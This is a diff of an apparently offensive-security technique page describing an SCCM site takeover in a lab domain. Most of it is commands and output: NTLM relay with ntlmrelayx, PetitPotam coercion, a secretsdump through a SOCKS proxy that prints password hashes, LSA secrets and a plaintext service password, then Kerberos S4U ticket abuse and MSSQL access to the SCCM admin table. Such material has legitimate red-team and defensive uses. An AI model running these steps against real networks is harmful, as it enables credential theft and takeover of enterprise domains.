@@ -35,42 +35,47 @@ The steps to execute TAKEOVER-2.1 and TAKEOVER-2.2 are mostly the same except th
 ### Linux
 1. Start `ntlmrelayx` with a SOCKS proxy
 ```
-# impacket-ntlmrelayx -smb2support -ts -ip 192.168.57.130 -t 192.168.57.31 -socks
-Impacket v0.11.0 - Copyright 2023 Fortra
+└─# ntlmrelayx.py -t smb://10.10.100.8 -socks -smb2support
+Impacket v0.12.0.dev1+20240130.154745.97007e84 - Copyright 2023 Fortra
 
-[2024-03-01 12:51:57] [*] Protocol Client MSSQL loaded..
-[2024-03-01 12:51:57] [*] Protocol Client LDAPS loaded..
-[2024-03-01 12:51:57] [*] Protocol Client LDAP loaded..
-[2024-03-01 12:51:57] [*] Protocol Client RPC loaded..
-[2024-03-01 12:51:57] [*] Protocol Client HTTP loaded..
-[2024-03-01 12:51:57] [*] Protocol Client HTTPS loaded..
-[2024-03-01 12:51:57] [*] Protocol Client IMAPS loaded..
-[2024-03-01 12:51:57] [*] Protocol Client IMAP loaded..
-[2024-03-01 12:51:57] [*] Protocol Client SMTP loaded..
-[2024-03-01 12:51:57] [*] Protocol Client SMB loaded..
-[2024-03-01 12:51:57] [*] Protocol Client DCSYNC loaded..
-[2024-03-01 12:51:58] [*] Running in relay mode to single host
-[2024-03-01 12:51:58] [*] SOCKS proxy started. Listening at port 1080
-[2024-03-01 12:51:58] [*] HTTPS Socks Plugin loaded..
-[2024-03-01 12:51:58] [*] HTTP Socks Plugin loaded..
-[2024-03-01 12:51:58] [*] MSSQL Socks Plugin loaded..
-[2024-03-01 12:51:58] [*] IMAP Socks Plugin loaded..
-[2024-03-01 12:51:58] [*] SMB Socks Plugin loaded..
-[2024-03-01 12:51:58] [*] SMTP Socks Plugin loaded..
-[2024-03-01 12:51:58] [*] IMAPS Socks Plugin loaded..
-[2024-03-01 12:51:58] [*] Setting up SMB Server
-[2024-03-01 12:51:58] [*] Setting up HTTP Server on port 80
-[2024-03-01 12:51:58] [*] Setting up WCF Server
-[2024-03-01 12:51:58] [*] Setting up RAW Server on port 6666
+[*] Protocol Client SMB loaded..
+[*] Protocol Client IMAP loaded..
+[*] Protocol Client IMAPS loaded..
+[*] Protocol Client RPC loaded..
+[*] Protocol Client DCSYNC loaded..
+[*] Protocol Client MSSQL loaded..
+[*] Protocol Client LDAP loaded..
+[*] Protocol Client LDAPS loaded..
+[*] Protocol Client SMTP loaded..
+[*] Protocol Client HTTPS loaded..
+[*] Protocol Client HTTP loaded..
+[*] Running in relay mode to single host
+[*] SOCKS proxy started. Listening on 127.0.0.1:1080
+[*] SMTP Socks Plugin loaded..
+[*] IMAPS Socks Plugin loaded..
+[*] IMAP Socks Plugin loaded..
+[*] MSSQL Socks Plugin loaded..
+[*] HTTP Socks Plugin loaded..
+[*] HTTPS Socks Plugin loaded..
+[*] SMB Socks Plugin loaded..
+[*] Setting up SMB Server
+[*] Setting up HTTP Server on port 80
+ * Serving Flask app 'impacket.examples.ntlmrelayx.servers.socksserver'
+ * Debug mode: off
+[*] Setting up WCF Server
+[*] Setting up RAW Server on port 6666
+
+[*] Servers started, waiting for connections
+Type help for list of commands
+ntlmrelayx>
 ```
 
 2. Coerce auth
 
 ```
-# python3 PetitPotam.py -d MAYYHEM.LOCAL -u lowpriv -p P@ssw0rd 192.168.57.130 192.168.57.50 
-
+└─# python3 PetitPotam.py -u lowpriv -p P@ssw0rd 10.10.100.136 sccm.internal.lab
 Trying pipe lsarpc
-[-] Connecting to ncacn_np:192.168.57.50[\PIPE\lsarpc]
+[-] Connecting to ncacn_np:sccm.internal.lab[\PIPE\lsarpc]
 [+] Connected!
 [+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
 [+] Successfully bound!
@@ -85,86 +90,114 @@ Trying pipe lsarpc
 3. Receive connection on relay server
 
 ```
-[2024-03-01 12:53:19] [*] SMBD-Thread-11 (process_request_thread): Received connection from 192.168.57.50, attacking target smb://192.168.57.31
-[2024-03-01 12:53:19] [*] Authenticating against smb://192.168.57.31 as MAYYHEM/SITE-SERVER$ SUCCEED
-[2024-03-01 12:53:19] [*] SOCKS: Adding MAYYHEM/SITE-SERVER$@192.168.57.31(445) to active SOCKS connection. Enjoy
-[2024-03-01 12:53:19] [*] SMBD-Thread-12 (process_request_thread): Connection from 192.168.57.50 controlled, but there are no more targets left!
-[2024-03-01 12:53:19] [*] SMBD-Thread-13 (process_request_thread): Connection from 192.168.57.50 controlled, but there are no more targets left!
-[2024-03-01 12:53:19] [*] SMBD-Thread-14 (process_request_thread): Connection from 192.168.57.50 controlled, but there are no more targets left!
-[2024-03-01 12:53:19] [*] SMBD-Thread-15 (process_request_thread): Connection from 192.168.57.50 controlled, but there are no more targets left!
-
-ntlmrelayx> socks
-Protocol  Target         Username              AdminStatus  Port 
---------  -------------  --------------------  -----------  ----
-SMB       192.168.57.31  MAYYHEM/SITE-SERVER$  TRUE         445 
+[*] Servers started, waiting for connections
+Type help for list of commands
+ntlmrelayx> [*] SMBD-Thread-9 (process_request_thread): Received connection from 10.10.100.9, attacking target smb://10.10.100.8
+[*] Authenticating against smb://10.10.100.8 as LAB/SCCM$ SUCCEED
+[*] SOCKS: Adding LAB/SCCM$@10.10.100.8(445) to active SOCKS connection. Enjoy
+[*] SMBD-Thread-10 (process_request_thread): Connection from 10.10.100.9 controlled, but there are no more targets left!
+socks
+Protocol  Target       Username   AdminStatus  Port
+--------  -----------  ---------  -----------  ----
+SMB       10.10.100.8  LAB/SCCM$  TRUE         445
+ntlmrelayx>
 ```
 
 4. Proxy in secretsdump
 
 ```
-# proxychains impacket-secretsdump MAYYHEM/SITE-SERVER\$@192.168.57.31
+└─# proxychains secretsdump.py 'lab/sccm$@10.10.100.8' -no-pass
 [proxychains] config file found: /etc/proxychains4.conf
 [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
-[proxychains] DLL init: proxychains-ng 4.17
-[proxychains] DLL init: proxychains-ng 4.17
-[proxychains] DLL init: proxychains-ng 4.17
-Impacket v0.11.0 - Copyright 2023 Fortra
+[proxychains] DLL init: proxychains-ng 4.16
+Impacket v0.12.0.dev1+20240130.154745.97007e84 - Copyright 2023 Fortra
 
-Password:
-[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.57.31:445  ...  OK
-[*] Service RemoteRegistry is in stopped state
-[*] Starting service RemoteRegistry
-[*] Target system bootKey: 0xc572147b3e06ec7f803013a6a063b524
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.100.8:445  ...  OK
+[*] Target system bootKey: 0xf81f8be7c4c43d38858d17318ffa025e
 [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:2b073c86868014e813942f6a91c031bd:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:26f78b6fd483ddd6c54497e6ffbffbc2:::
 [*] Dumping cached domain logon information (domain/username:hash)
-MAYYHEM.LOCAL/sccmadmin:$DCC2$10240#sccmadmin#9c5f6da0aea59713bb5f5dc02c638b48: (2024-02-29 18:49:56)
-MAYYHEM.LOCAL/Administrator:$DCC2$10240#Administrator#dfb35a65f92d8af602f08e358a58dc42: (2024-02-24 18:21:18)
-MAYYHEM.LOCAL/sqlsvc:$DCC2$10240#sqlsvc#e12866f9a8777ddbe39ae1380ac6346c: (2024-03-01 17:23:29)
+INTERNAL.LAB/Administrator:$DCC2$10240#Administrator#dfb35a65f92d8af602f08e358a58dc42: (2024-02-10 00:27:04)
+INTERNAL.LAB/Administrator:$DCC2$10240#Administrator#dfb35a65f92d8af602f08e358a58dc42: (2024-02-10 02:33:07)
+INTERNAL.LAB/sqlsvc:$DCC2$10240#sqlsvc#e12866f9a8777ddbe39ae1380ac6346c: (2024-02-23 22:25:28)
+INTERNAL.LAB/Administrator:$DCC2$10240#Administrator#dfb35a65f92d8af602f08e358a58dc42: (2024-02-20 03:20:11)
+INTERNAL.LAB/Administrator:$DCC2$10240#Administrator#dfb35a65f92d8af602f08e358a58dc42: (2024-02-22 21:51:57)
+INTERNAL.LAB/Administrator:$DCC2$10240#Administrator#dfb35a65f92d8af602f08e358a58dc42: (2024-02-23 00:31:30)
+INTERNAL.LAB/Administrator:$DCC2$10240#Administrator#dfb35a65f92d8af602f08e358a58dc42: (2024-03-01 17:04:52)
 [*] Dumping LSA Secrets
-[*] $MACHINE.ACC 
-MAYYHEM\SITE3-DB$:aes256-cts-hmac-sha1-96:007976468ea0315075ce15a87f4c53d84fb3ad113076f362ec9dc0f79281ba03
-MAYYHEM\SITE3-DB$:aes128-cts-hmac-sha1-96:2d8e3cd4527e138dc7b575e411bb3068
-MAYYHEM\SITE3-DB$:des-cbc-md5:83f1c8c46ead7ca4
-MAYYHEM\SITE3-DB$:plain_password_hex:6100690040005a0044005100330033006e0059005a006a002c00530057006f002b0070005d00410020002500470052005100720045006d00630037006d00610066002600590074003e0058006d00780058005100740073003a0043002b0070003a004b0079006f0046004b0036004100330072007a002c0041003600320023002900550068002900630058007a004a006e002d0070004c005e006c0066004f003c006000470048005a00320068002b005a0061007800670040004700750040003500250061006f004600240028004400780025002e00730048005c003f0024006a003000710074004f0071007a006d00
-MAYYHEM\SITE3-DB$:aad3b435b51404eeaad3b435b51404ee:1eca4d3eef64b6aaf28ed0a528afbaf0:::
-[*] DPAPI_SYSTEM 
-dpapi_machinekey:0xf4704cc00adfc198ca52f755a535d43c42054a44
-dpapi_userkey:0x09f0ba58ff1d4b67d7d24bf126ff33e682b57fcf
-[*] NL$KM 
- 0000   29 78 85 64 E8 D8 57 5E  62 0F 15 6D 78 D3 C3 BD   )x.d..W^b..mx...
- 0010   D1 11 71 D7 E1 D6 75 B5  F3 90 9B AD 3E C7 07 6E   ..q...u.....>..n
- 0020   C4 EE 9C DC 2E 43 E7 C3  9A 2E 98 5B A3 7B 8E E1   .....C.....[.{..
- 0030   72 8F 2B A0 4A 4D BE D0  AB CB 42 A7 61 E5 B0 C1   r.+.JM....B.a...
-NL$KM:29788564e8d8575e620f156d78d3c3bdd11171d7e1d675b5f3909bad3ec7076ec4ee9cdc2e43e7c39a2e985ba37b8ee1728f2ba04a4dbed0abcb42a761e5b0c1
-[*] _SC_MSSQLSERVER 
-MAYYHEM\sqlsvc:P@ssw0rd
-[*] _SC_SQLSERVERAGENT 
-MAYYHEM\sqlsvc:P@ssw0rd
-[*] Cleaning up... 
-[*] Stopping service RemoteRegistry
+[*] $MACHINE.ACC
+LAB\SQL$:aes256-cts-hmac-sha1-96:8d15fd9651116c18930d6244351147f367cdb25b163acf8e112139c5462ba832
+LAB\SQL$:aes128-cts-hmac-sha1-96:340346aa26b46b5a7be81b478c3e0d27
+LAB\SQL$:des-cbc-md5:2a80e6012a02b586
+LAB\SQL$:plain_password_hex:2f007700410042003b0047005d00720044006d00370047007700390073003200690035002b0054005e0031004e005c004300450037003c004d005100560035003c0043005c003a00380050002f004900400044004b0069002d00740026003d0043004b004e006b0061005000690059005000480049004c0065005e00600054003c006f0048003d004600690067005d004d004000670070005d005800370078006a0043003a0047003f0034006b00640056002e004500440052002600200049006900230047005800620058002200510069006800220032003e007400360043005d00780032002f002800260061004300
+LAB\SQL$:aad3b435b51404eeaad3b435b51404ee:e0173405c3e9c5ecaba657bc628889ce:::
+[*] DPAPI_SYSTEM
+dpapi_machinekey:0xb5ca959a9a6ed97054bdae10d23275b776378b3d
+dpapi_userkey:0x49206429f367c2e332d88015e0405e68646fe959
+[*] NL$KM
+ 0000   39 47 80 9E 3B 1E F2 D0  3C 1F 6D C5 E3 77 A9 9C   9G..;...<.m..w..
+ 0010   F4 8A EF DD 7E 4D 10 2D  1E 59 F9 B3 FB FE 1F E9   ....~M.-.Y......
+ 0020   86 4E 14 EF 0D E8 0D 8A  7C 85 B8 66 A4 C9 DD DC   .N......|..f....
+ 0030   CE DD F1 02 33 72 BD 1C  CF 1E 53 F1 28 F4 5B AE   ....3r....S.(.[.
+NL$KM:3947809e3b1ef2d03c1f6dc5e377a99cf48aefdd7e4d102d1e59f9b3fbfe1fe9864e14ef0de80d8a7c85b866a4c9dddcceddf1023372bd1ccf1e53f128f45bae
+[*] _SC_MSSQLSERVER
+LAB\sqlsvc:P@ssw0rd
+[*] Cleaning up...
+
 ```
 
 5. Get TGT for SQL service account running the site database
 
 ```
-# impacket-getTGT MAYYHEM/sqlsvc:P@ssw0rd                                  
-Impacket v0.11.0 - Copyright 2023 Fortra
+└─# getTGT.py internal.lab/sqlsvc:"P@ssw0rd"
+Impacket v0.10.1.dev1+20230802.213755.1cebdf31 - Copyright 2022 Fortra
 
 [*] Saving ticket in sqlsvc.ccache
-
 ```
 
 6. S4U
 
 ```
-# python3 gets4uticket.py kerberos+ccache://mayyhem.local\\sqlsvc:sqlsvc.ccache@dc.mayyhem.local MSSQLSvc/SITE3-DB.MAYYHEM.LOCAL:1433@mayyhem.local site-server@mayyhem.local s4u.ccache -v
+└─# python3 gets4uticket.py kerberos+ccache://internal.lab\\sqlsvc:sqlsvc.ccache@dc01.internal.lab MSSQLSvc/sql.internal.lab:1433@internal.lab sccm\$@internal.lab sccm_s4u.ccache -v
+2024-03-01 21:31:03,310 minikerberos INFO     Trying to get SPN with sccm$@internal.lab for MSSQLSvc/sql.internal.lab:1433@internal.lab
+INFO:minikerberos:Trying to get SPN with sccm$@internal.lab for MSSQLSvc/sql.internal.lab:1433@internal.lab
+2024-03-01 21:31:05,126 minikerberos INFO     Success!
+INFO:minikerberos:Success!
+2024-03-01 21:31:05,127 minikerberos INFO     Done!
+INFO:minikerberos:Done!
 ```
+7. Auth to MSSQL
 
+```
+└─# KRB5CCNAME=sccm_s4u.ccache mssqlclient.py internal.lab/sccm\$@sql.internal.lab  -k -no-pass -windows-auth
+Impacket v0.10.1.dev1+20230802.213755.1cebdf31 - Copyright 2022 Fortra
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(SQL): Line 1: Changed database context to 'master'.
+[*] INFO(SQL): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
+[!] Press help for extra shell commands
+SQL (LAB\sccm$  dbo@master)> use CM_LAB
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: CM_LAB
+[*] INFO(SQL): Line 1: Changed database context to 'CM_LAB'.
+SQL (LAB\sccm$  dbo@CM_LAB)> select * from RBAC_Admins;
+ AdminID                                                      AdminSID   LogonName           DisplayName   IsGroup   IsDeleted   CreatedBy           CreatedDate   ModifiedBy          ModifiedDate   SourceSite   DistinguishedName   AccountType
+--------   -----------------------------------------------------------   -----------------   -----------   -------   ---------   -----------------   -----------   -----------------   ------------   ----------   -----------------   -----------
+16777217   b'0105000000000005150000005407a9ee65b1f9b01fff385ef4010000'   LAB\Administrator   NULL                0           0   LAB\administrator   2024-02-10 01:21:52   LAB\administrator   2024-02-10 01:21:52   LAB          NULL                       NULL
+
+16777220   b'0105000000000005150000005407a9ee65b1f9b01fff385e59040000'   LAB\lowpriv         lowpriv             0           0   LAB\administrator   2024-02-29 21:50:54   LAB\administrator   2024-02-29 21:50:54   LAB                                      128
+
+SQL (LAB\sccm$  dbo@CM_LAB)>
+```
 
 
 ## References
 Author, Title, URL
+
+exploit.ph, Revisiting Delegate 2 thyself, 
